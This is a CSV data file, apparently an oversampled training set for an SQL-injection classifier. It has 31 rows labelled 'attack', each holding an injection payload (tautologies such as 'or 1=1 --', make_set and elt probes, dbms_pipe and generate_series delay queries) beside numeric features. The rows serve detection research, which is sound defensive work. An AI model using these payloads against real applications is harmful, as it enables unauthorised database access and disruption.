id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000372,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000838,0.0977764071025101,130.0,31.85533660572277,4.250228688065841,72.0,8.927668302861385,33.14466339427723,15.927668302861385,0.5538461538461539,0.0686743715604722,0.2549589491867479,0.12252052540662606,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0723316971386145,0.0,0.0,2.9276683028613855,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000373,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000521,0.34356318328945246,70.92962771870305,26.30987590623435,3.798183702748113,15.6197518124687,21.0,24.6197518124687,9.69012409376565,0.2200466166521063,0.29617961211491894,0.34698073612992875,0.13679303510304597,0.0,1.0,2.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,0.6901240937656499,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000374,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000529,0.2695947895586946,111.55063819077206,30.919479899487335,3.794711597702338,44.194798994873366,13.0,41.51687939692402,12.838959798974674,0.3958298619316207,0.11679941346250239,0.3722664711541675,0.11510425345170948,0.9194798994873367,0.0,0.0,0.0,1.0,1.0,0.0,6.919479899487337,0.0,1.0,1.0,2.0,0.9194798994873367,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.9194798994873367,0.08052010051266334,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000375,attack,boolean," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000044,0.08938944644272404,69.0,22.986131559944766,3.4168250563792673,26.0,5.0,28.0,10.0,0.37681159420289856,0.07246376811594203,0.4057971014492754,0.14492753623188406,0.0,1.0138684400552345,2.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,6.0,0.0,1.0,1.0,0.9861315599447656,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000376,attack,boolean,"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",nearest_attack_euclidean,R000259,0.4843091052261421,64.74226736361044,26.09690694544417,3.962377908168053,18.193813890888347,16.0,20.0,10.548453472722088,0.28024559061562604,0.24750209970684472,0.3093776246335559,0.1628746850439733,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.5484534727220867,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000377,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000019,0.720315870671546,63.0,23.0,3.4284551513051755,24.0,4.0,26.0,9.0,0.38095238095238093,0.06349206349206349,0.4126984126984127,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.5668470971930707,0.0,0.0,5.433152902806929,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000378,attack,boolean,"1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --",nearest_attack_euclidean,R000468,0.018964422132681135,70.0,26.937734960231037,3.8732477989414167,15.000000000000004,21.0,24.0,10.0,0.2142857142857143,0.3,0.34285714285714286,0.14285714285714285,1.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000379,attack,boolean,"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",nearest_attack_euclidean,R001508,0.318489047966064,67.5521019568142,25.420840782725676,3.748308447951083,13.841681565451353,21.0,24.0,8.710420391362838,0.20421071074817265,0.31123321080319344,0.3556950980607924,0.1288609803878415,0.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,0.710420391362838,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000380,attack,boolean,"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001033,0.4227159067660771,145.87304773846773,31.312174623077954,4.169269139437331,81.59261118077283,8.656087311538975,39.31217462307795,16.312174623077954,0.5593022061393544,0.05930220613935444,0.26965721178371904,0.11173837593757206,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.6560873115389767,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000381,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R001148,0.19510211034679914,150.09778063132995,28.29334189398991,3.9734067028663778,74.39112252531987,10.0,43.804438737340064,21.902219368670032,0.49560408883353485,0.06662349641000884,0.2918482765043042,0.1459241382521521,0.0,4.0,0.0,0.0,1.0,1.9022193686700302,0.0,6.0,0.0,5.0,4.0,2.90221936867003,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000382,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R000410,0.9862727262211175,71.85526807186196,22.0,3.5926679978168625,20.999999999999996,13.0,26.92763403593098,10.927634035930982,0.29247864295191095,0.1810582075416592,0.3746520101634668,0.15181113934296314,0.0,4.0,0.0,0.0,0.0,1.463817017965491,0.0,4.0,0.0,0.4638170179654911,1.0,1.463817017965491,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000383,attack,boolean,"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001055,0.4116560517239753,159.42933283889062,34.892666790277346,3.894351875360527,48.0,23.553666604861327,61.32199962916796,26.553666604861327,0.30126230056335845,0.14775157999046196,0.3844056456705078,0.16658047377567187,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.553666604861327,0.0,2.0,1.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000384,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000833,0.10849597739388832,68.0,29.373351627375612,4.189856043391822,24.0,16.0,18.0,10.0,0.35294117647058826,0.23529411764705882,0.2647058823529412,0.14705882352941177,0.0,4.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000385,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001220,0.09887738834444748,76.65821206151698,19.113929312827672,2.9482432559644094,9.151905750436903,13.0,39.544282748689305,14.962023562390776,0.11970451379487937,0.16967976378920538,0.5153898566058818,0.19522586581003343,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.92404712478155,2.0,0.037976437609224756,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000386,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R001259,0.5468371807432875,70.59760831842019,18.621956479824465,3.061010275289264,14.932934719736696,10.243912959648931,34.48782591929786,10.932934719736698,0.21209902508341105,0.14411044810220552,0.48907974394159687,0.15471078287278656,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.6219564798244654,0.0,0.0,0.3109782399122327,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000387,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001466,0.6744922724809651,136.29874063766374,36.298740637663734,3.8782020613667694,42.0,23.0,54.0,17.29874063766373,0.3081501123453265,0.16874887104625022,0.39619300158684834,0.12690801502157492,2.0,0.29874063766373105,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.2987406376637311,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000388,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001277,0.29958839058865044,128.17524745141694,33.932248907750115,3.859187083552448,43.0,21.0,48.864497815500236,15.310749635916705,0.33568828974752785,0.1639407926673973,0.3809338879661316,0.11943702961894323,1.0,0.0,2.0,0.0,1.0,2.0,0.0,7.3107496359167055,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000389,attack,boolean,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",nearest_attack_euclidean,R000808,0.5192374868086719,96.89114044208533,27.318818725611376,3.4532150407499733,22.637637451222755,16.0,43.27527490244551,14.978228088417067,0.23345184239516262,0.16607412135752025,0.4461444196206352,0.15432961662668193,0.0,4.0,1.0,0.0,0.0,1.0,0.0,7.3188187256113775,0.0,0.6594093628056887,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000520,0.7540366353865172,126.29626201707961,29.837009613663685,4.235203439240391,80.21476682391145,3.459252403415922,29.16299038633631,13.459252403415922,0.6348348906507808,0.027322987745207278,0.23130949520981714,0.10653262639419477,3.0,0.0,0.0,0.0,1.0,0.0,0.0,3.5407475965840787,0.0,0.0,2.4592524034159218,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000391,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000415,0.6865600142483737,129.16018994161064,33.69336499026844,3.7774464385960345,42.0,21.0,51.16018994161064,15.0,0.3253295891573956,0.1626647945786978,0.39581647727912245,0.11618913898478414,0.30663500973156066,0.0,2.0,0.0,1.0,2.0,0.0,7.69336499026844,0.0,1.0,1.0,5.0,0.30663500973156066,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000392,attack,boolean,"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000272,0.32595426795471877,146.85721790461827,31.28556419076344,3.779261939217703,41.0,24.0,56.0,25.85721790461828,0.2791843288561481,0.16342497298896475,0.38132493697425107,0.1760657611806361,0.0,0.8572179046182793,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.0,0.8572179046182793,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000393,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001199,0.4214053172614631,130.9179904220457,34.194532694803044,3.865621552805834,39.52892503243961,15.0,50.58359808440914,25.805467305196952,0.30084881766480437,0.11479622725466097,0.3867351963342485,0.19761975874628615,1.0,0.0,2.0,0.0,0.0,1.0,0.0,11.0,0.805467305196953,2.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000394,attack,boolean,"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",nearest_attack_euclidean,R000230,0.20125318732944125,89.0,18.140665535066052,2.7928098309569402,9.0,21.0,48.0,11.0,0.101123595505618,0.23595505617977527,0.5393258426966292,0.12359550561797752,0.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000395,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R001179,0.22308253326762115,129.73979403702324,31.855017163581397,4.3288600728110485,80.0,4.0,30.449828364186033,15.289965672837207,0.6172330623347178,0.030861653116735888,0.23410290198337827,0.11780238256516819,0.0,3.0,0.0,0.0,1.0,1.0,0.0,3.289965672837207,0.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000396,attack,boolean,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R000594,1.1324595437085494,109.64730770730682,30.0,3.6836584801284853,34.422482518846074,13.0,44.3798601507686,17.84496503769215,0.3144788343538921,0.11884934316954116,0.4039692692800594,0.16270255319650737,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.844965037692149,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.4224825188460746,0.5775174811539254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000397,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R000582,0.3167677716297902,164.73840635146087,30.728200529288404,3.9106217833346912,72.09740370501883,16.728200529288404,58.456401058576816,17.45640105857681,0.4374893831057334,0.10156382711178333,0.3550484357106499,0.10589835407183334,0.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.0,2.7282005292884053,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000398,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000342,0.12630517671259364,65.0,17.418687608322628,2.9890966625153044,14.0,9.0,32.0,10.0,0.2153846153846154,0.13846153846153847,0.49230769230769234,0.15384615384615385,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R001001,0.5902315027100133,81.0858376479342,27.0143062746557,3.536119795356368,19.0143062746557,14.685741699540932,35.37148339908186,12.014306274655699,0.2353036636575649,0.18062404222773845,0.4361248084455477,0.14794748566914898,0.0,4.0,1.0,0.0,0.0,1.0,0.0,5.342870849770466,0.0,0.0,0.6714354248852329,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000742,0.03582057654073103,129.28991039994176,29.0,3.931705025112723,65.0,8.0,41.23192831995342,15.057982079988355,0.5027858280691765,0.06188133268543711,0.3188726383707265,0.11646020087465991,0.0,0.0,2.0,0.0,1.0,1.0,0.0,6.057982079988355,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000401,attack,boolean,"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001234,0.4506270943729398,129.7042466547894,34.58753428062403,3.849503565281479,43.0,21.0,50.175068561248054,15.529178093541342,0.33176497158635015,0.1620247535654268,0.3864995253575697,0.1197107494906533,1.0,0.0,2.0,0.0,1.0,2.0,0.0,7.529178093541343,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000402,attack,boolean,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,nearest_attack_euclidean,R000718,0.32088560799816307,85.58061397898499,21.258061397898498,3.1180321824253543,13.0,16.0,42.06449118318799,14.516122795796997,0.1522803495625334,0.18742196869234878,0.49075375165762447,0.1695439300874933,4.0,0.0,1.0,0.0,1.0,2.0,0.0,6.516122795796997,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
